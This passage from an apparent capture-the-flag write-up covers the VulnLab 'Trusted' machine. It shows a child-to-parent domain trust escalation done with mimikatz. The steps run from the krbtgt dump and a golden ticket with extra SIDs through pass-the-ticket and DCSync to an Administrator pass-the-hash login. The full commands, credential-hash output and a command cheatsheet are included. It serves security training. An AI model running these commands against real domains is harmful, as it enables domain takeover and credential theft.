* aes128_hmac 9d59311c51bd3eb6cc846cf1af53c80f  
* rc4_hmac_nt fdb9239325aed982da5f521116ffbcaf  
  
[Out-1] TRUSTED.VL -> LAB.TRUSTED.VL  
* 2/15/2025 7:02:42 PM - CLEAR - 7a 6f b9 f0 49 87 53 be 90 63 63 9c d9 8e 15 f5 ce b5 60 98 6d e6 08 0f 7b ab 3a 7b e3 59 48 a4 f4 6e 6f 1a cc 87 f2 19 81 9a 3b e5 f6 b0 59 28 ad 97 e2 fd fb 39 f8 15 98 ca 4e a9 c4 04 60 15 6a ca 97 0e 20 81 77 42 ac c0 c9 0d 4f 49 4d 64 ee 2a 0f ed aa 4c f3 5b fb 51 ef 50 1a 84 5d 15 a8 9c ce a5 37 a7 02 47 ff 67 0d 1a 59 1c f6 c9 11 9f a2 55 7f c0 45 db 29 77 db 54 9e 46 23 ea 60 a3 9d 9c 11 61 44 51 d2 3f 32 cc e3 67 95 1c a5 0a 0f c6 96 3d e2 a3 53 2b 92 41 a2 a2 46 9e 27 65 c4 84 b0 6f 6e 4e 95 70 0e ed a6 a9 8e 1b ac 66 e8 40 61 9f 6e 70 44 6e b1 fc dd a7 72 9d 3e bd ac b7 0e b9 6b 3c a6 b5 a0 d2 9b 74 91 39 02 f8 7c 31 16 09 7c 52 f3 e9 00 3e 0c 88 46 a3 05 c6 5c 2b f9 3c 0c 21 bd b2 04 8b bc 8a b0 74  
* aes256_hmac bfc64ba951d28743ef247deb0fa7d69197b9fda301c64ae0765ba9c5c6418183  
* aes128_hmac 0fe86c75c4b6686fcae0bd01d0a1fa2c  
* rc4_hmac_nt cddbd971c2e3e4ef64b4eb024e4e75c0  
  
  
mimikatz(commandline) # exit  
Bye!  
PS C:\Users\Administrator\Documents>
```

![](https://cdn-images-1.medium.com/max/800/1*nLaNLSVjGTSzSCDsbcHVFg.png)

2. Second step: Retrieving the **Domain SID** using this command:

```powershell
PS C:\Users\Administrator\Documents> whoami /user  
  
USER INFORMATION  
----------------  
  
User Name SID  
================= =============================================  
lab\administrator S-1-5-21-2241985869-2159962460-1278545866-500  
PS C:\Users\Administrator\Documents>
```

3. Third step: Retrieving the **SID of the Enterprise Admin** using this command:

```powershell
PS C:\Users\Administrator\Documents> get-adgroup -Filter {name -eq "Enterprise Admins"} -Server trusted.vl  
  
  
DistinguishedName : CN=Enterprise Admins,CN=Users,DC=trusted,DC=vl  
GroupCategory : Security  
GroupScope : Universal  
Name : Enterprise Admins  
ObjectClass : group  
ObjectGUID : 9e72548e-1fda-486c-b426-6bcb7f171253  
SamAccountName : Enterprise Admins  
SID : S-1-5-21-3576695518-347000760-3731839591-519  
  
  
  
PS C:\Users\Administrator\Documents>
```

4. Fourth step: Dumping **krbtgt** because this attack is basically like a **Golden Ticket**, but even better… **Golden is now more golden!** 🎫🔥

```powershell
PS C:\Users\Administrator\Documents> .\mimi.exe "privilege::debug" "lsadump::lsa /patch /user:krbtgt" "exit"  
  
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08  
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)  
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz  
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/  
  
mimikatz(commandline) # privilege::debug  
Privilege '20' OK  
  
mimikatz(commandline) # lsadump::lsa /patch /user:krbtgt  
Domain : LAB / S-1-5-21-2241985869-2159962460-1278545866  
  
RID  : 000001f6 (502)  
User : krbtgt  
LM   :  
NTLM : c7a03c565c68c6fac5f8913fab576ebd  
  
mimikatz(commandline) # exit  
Bye!  
PS C:\Users\Administrator\Documents>
```

![](https://cdn-images-1.medium.com/max/800/1*qjcSJ7fL8vGAlM2oH723Fw.png)

5. Fifth step: Now, let’s **fire up the attack** and take over!

```powershell
PS C:\Users\Administrator\Documents> .\mimi.exe "privilege::debug" "kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ticket:C:\Users\Administrator\Documents\ticket.kirbi" "exit"  
  
.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08  
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)  
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
## \ / ## > https://blog.gentilkiwi.com/mimikatz  
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )  
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/  
  
mimikatz(commandline) # privilege::debug  
Privilege '20' OK  
  
mimikatz(commandline) # kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ticket:C:\Users\Administrator\Documents\ticket.kirbi  
User : Administrator  
Domain : lab.trusted.vl (LAB)  
SID : S-1-5-21-2241985869-2159962460-1278545866  
User Id : 500  
Groups Id : *513 512 520 518 519  
Extra SIDs: S-1-5-21-3576695518-347000760-3731839591-519 ;  
ServiceKey: c7a03c565c68c6fac5f8913fab576ebd - rc4_hmac_nt  
Lifetime : 2/15/2025 8:47:36 PM ; 2/13/2035 8:47:36 PM ; 2/13/2035 8:47:36 PM  
-> Ticket : C:\Users\Administrator\Documents\ticket.kirbi  
  
* PAC generated  
* PAC signed  
* EncTicketPart generated  
* EncTicketPart encrypted  
* KrbCred generated  
  
Final Ticket Saved to file !  
  
mimikatz(commandline) # exit  
Bye!  
PS C:\Users\Administrator\Documents>
```

Now, let’s **pass the ticket** to inject our forged ticket into the session. After that, we’ll perform **DCSync**, dump the **Administrator’s hash**, and log in like a boss

```powershell
PS C:\Users\Administrator\Documents> .\mimi.exe "privilege::debug" "kerberos::ptt C:\users\administrator\documents\ticket.kirbi" "lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /user:S-1-5-21-3576695518-347000760-3731839591-500" "exit"  
  
.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08  
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)  
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
## \ / ## > https://blog.gentilkiwi.com/mimikatz  
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )  
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/  
  
mimikatz(commandline) # privilege::debug  
Privilege '20' OK  
  
mimikatz(commandline) # kerberos::ptt C:\users\administrator\documents\ticket.kirbi  
  
* File: 'C:\users\administrator\documents\ticket.kirbi': OK  
  
mimikatz(commandline) # lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /user:S-1-5-21-3576695518-347000760-3731839591-500  
[DC] 'trusted.vl' will be the domain  
[DC] 'trusteddc.trusted.vl' will be the DC server  
[DC] 'S-1-5-21-3576695518-347000760-3731839591-500' will be the user account  
[rpc] Service : ldap  
[rpc] AuthnSvc : GSS_NEGOTIATE (9)  
  
Object RDN : Administrator  
  
** SAM ACCOUNT **  
  
SAM Username : Administrator  
Account Type : 30000000 ( USER_OBJECT )  
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )  
Account expiration : 1/1/1601 12:00:00 AM  
Password last change : 9/18/2022 8:50:53 PM  
Object Security ID : S-1-5-21-3576695518-347000760-3731839591-500  
Object Relative ID : 500  
  
Credentials:  
Hash NTLM: 15db914be1e6a896e7692f608a9d72ef  
ntlm- 0: 15db914be1e6a896e7692f608a9d72ef  
ntlm- 1: 86a9ee70dfd64d20992283dc5721b475  
lm - 0: 1a28b083f0e83167bec07d185d492a67  
  
Supplemental Credentials:  
* Primary:NTLM-Strong-NTOWF *  
Random Value : 7ad3ac096b425259c12c6cade75241c9  
  
* Primary:Kerberos-Newer-Keys *  
Default Salt : TRUSTED.VLAdministrator  
Default Iterations : 4096  
Credentials  
aes256_hmac (4096) : d75ec7df1acac724a6dfc250e707aab3492b6d9936b9898f742781b0a871d4a6  
aes128_hmac (4096) : 1cee32af6e8cd27059d855e6c6b4d5ec  
des_cbc_md5 (4096) : aed5e385512c685e  
OldCredentials  
aes256_hmac (4096) : 11b39019ac5f9715327f55a1b44820da82e32b14ce2dd40f142192f4eeab1336  
aes128_hmac (4096) : c88a36f9c11a83c13a03f3d48aae78a4  
des_cbc_md5 (4096) : 2fe99be0a82c49d0  
OlderCredentials  
aes256_hmac (4096) : c88291723e622259b4a930eec2c087348c258a09d5720fdb11625fd6432057f8  
aes128_hmac (4096) : c803feb47873e961875882b3909edd2b  
des_cbc_md5 (4096) : 292ab5329be9ce40  
  
* Primary:Kerberos *  
Default Salt : TRUSTED.VLAdministrator  
Credentials  
des_cbc_md5 : aed5e385512c685e  
OldCredentials  
des_cbc_md5 : 2fe99be0a82c49d0  
  
* Packages *  
NTLM-Strong-NTOWF  
  
* Primary:WDigest *  
01 78a97cd0944c04736ebc5c6a41151044  
02 9f038aad902811d760f8ab1870ec8817  
03 8b69a5557480678e214f7fcf8a1b5299  
04 78a97cd0944c04736ebc5c6a41151044  
05 a02112deac62e4ac6f5ae005e80dca33  
06 524fdfa5abe0491f80ea30779ccc4673  
07 b8c416ff7f3b06308bdb914e5e974489  
08 01e3d6cffddd4bd9e9b6ae361e226569  
09 2d423b7e046d43c0e78e19f1d2cf3788  
10 98014f1215b902e6215f97ec52ba4915  
11 762701fd0c34e1f70c11fdb4378e9d3d  
12 01e3d6cffddd4bd9e9b6ae361e226569  
13 61f7063f23adab72b60fded48fbf2854  
14 d5c36527291c60a7ccd2fa4f214f36cc  
15 553607358db97eb65e234bf8aeb52e8d  
16 a8d4e1e3131446e6d000597a03727854  
17 dbf6bf6fad3583eb2bc387a540a3cf68  
18 fe8bb83ce7236f88c86ee1f56cb198bd  
19 b0bdc788c9df34f4d7b0ae9ecb970cc0  
20 df0e59fd58ada70c2c61de837652a72f  
21 035f102a7c5c5159054e450924b0a326  
22 0f8c9e30d9e9066376e868dc60178b7f  
23 c65977b340f78e2a1ff601035748959b  
24 4a3f6237a32c525029e3d2cf0cc4f51d  
25 7791924095599f3112d1156fa93e65c2  
26 c8377915d36d8bdd86925c1da86ebe04  
27 655f04c5a10c8045ec789ae964093ccf  
28 7e1eee2805079de9885d2c2957285a6e  
29 c10f5a9d43d4cc149bed1e98df67d560  
  
  
mimikatz(commandline) # exit  
Bye!  
PS C:\Users\Administrator\Documents>
```

### Root flag

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Trusted]  
└─# evil-winrm -i 10.10.231.181 -u administrator -H 15db914be1e6a896e7692f608a9d72ef  
  
Evil-WinRM shell v3.5  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> [System.IO.File]::GetAttributes("C:\Users\Administrator\Desktop\root.txt").ToString().Contains("Encrypted")  
True  
*Evil-WinRM* PS C:\Users\Administrator\Documents> CIPHER /u /n  
  
Encrypted File(s) on your system:  
C:\Documents and Settings\Administrator\Desktop\root.txt  
C:\Users\Administrator\Desktop\root.txt  
  
ls  
*Evil-WinRM* PS C:\Users\Administrator\Documents>  
*Evil-WinRM* PS C:\Users\Administrator\Documents>  
cat *Evil-WinRM* PS C:\Users\Administrator\Documents> ls  
root*Evil-WinRM* PS C:\Users\Administrator\Documen cat root.txt  
Cannot find path 'C:\Users\Administrator\Documents\root.txt' because it does not exist.  
At line:1 char:2  
+ cat root.txt  
+ ~~~~~~~~~~~~  
+ CategoryInfo : ObjectNotFound: (C:\Users\Admini...uments\root.txt:String) [Get-Content], ItemNotFoundException  
+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand  
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload RunasCs.exe  
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\RunasCs.exe administrator "Password!1234" "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"  
  
  
VL{1f-----------------------------}  
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> While Mimikatz is commonly used for SID History Injection, the same attack can also be performed using Rubeus. Additionally, for full automation, the attack can be executed using Impacket’s raiseChild, making it more efficient and less detectable in certain environments.

### Mini Cheatsheet for All Commands After Getting into RDP

```text
# 1. Import Active Directory module  
Import-Module ActiveDirectory  
  
# 2. Enumerate users in the domain  
Get-ADUser -Filter * -Properties *  
  
# 3. Enumerate trusts  
Get-ADTrust  
  
# 4. Dumping Trust Secrets with Mimikatz  
mimikatz.exe "privilege::debug" "lsadump::trust"  
  
# 5. Retrieve Domain SID  
wmic useraccount get name,sid  
  
# 6. Retrieve SID of Enterprise Admin  
Get-ADGroup -Filter {Name -eq "Enterprise Admins"}  
  
# 7. Dump krbtgt for Golden Ticket attack  
mimikatz.exe "lsadump::dcsync /user:krbtgt"  
  
# 8. Pass the ticket to inject into the session  
mimikatz.exe "kerberos::ptt <ticket_file>"  
  
# 9. Perform DCSync to dump hashes  
mimikatz.exe "lsadump::dcsync /user:<username>"
```

### Demo for the Same Attack on Trusted Machine

![](https://cdn-images-1.medium.com/max/1200/1*Ae4W1zFgT_HNpr8VCTalCg.gif)

*Demo for the same attack on the Trusted machine*

### Recap: Conquering the Trusted Machine

To sum it all up, this journey started with **initial access** via **web app** fuzzing and **LFI**, leading us to **RCE**. From there, we went on to **enumerate Active Directory**, focusing on **trust relationships**. By leveraging tools like **SharpHound**, we mapped out the bi-directional trust between domains and dug deep into **SID History attacks**.

We then uploaded **Mimikatz**, dumped the **krbtgt** account, and performed **DCSync** to retrieve hashes. After validating the hashes across services like **WinRM** and **RDP**, we bypassed **Restricted Mode** on RDP and gained access. Finally, we executed the **Golden Ticket** attack, allowing us to escalate privileges and dump the **Administrator hash**.

**Root flag** obtained — mission accomplished!

Remember: **Trust attacks are your best friends** in environments with weak domain configurations. Keep your enumeration clean and methodical, and you’ll find the weak spots that lead to total domination.

![](https://cdn-images-1.medium.com/max/800/0*eLRAarEs6blUsOXF.gif)

### Do You Wanna Chat with Maverick?🥂

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

### References

> 🔗 [https://habr.com/en/companies/jetinfosystems/articles/466445/](https://habr.com/en/companies/jetinfosystems/articles/466445/)

> 🔗 [https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/red-offensive/active-directory#attacking-domain-trusts](https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/red-offensive/active-directory#attacking-domain-trusts)

> 🔗 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

> 🔗 [https://adsecurity.org/?p=1588](https://adsecurity.org/?p=1588)

> 🔗 [https://adsecurity.org/?p=1640](https://adsecurity.org/?p=1640)

> 🔗 [https://www.thehacker.recipes/ad/movement/trusts](https://www.thehacker.recipes/ad/movement/trusts)

“These tools and techniques were instrumental in demonstrating the power of trust abuse and Active Directory exploitation, showcasing common tactics used in real-world red team engagements.”

> 🔗 [https://api.vulnlab.com/api/v1/share?id=1d3e5d07-988f-4099-b22a-220b815c97af](https://api.vulnlab.com/api/v1/share?id=1d3e5d07-988f-4099-b22a-220b815c97af)

By Mohamed Eletreby on February 17, 2025.

Canonical link

Exported from Medium on April 20, 2026.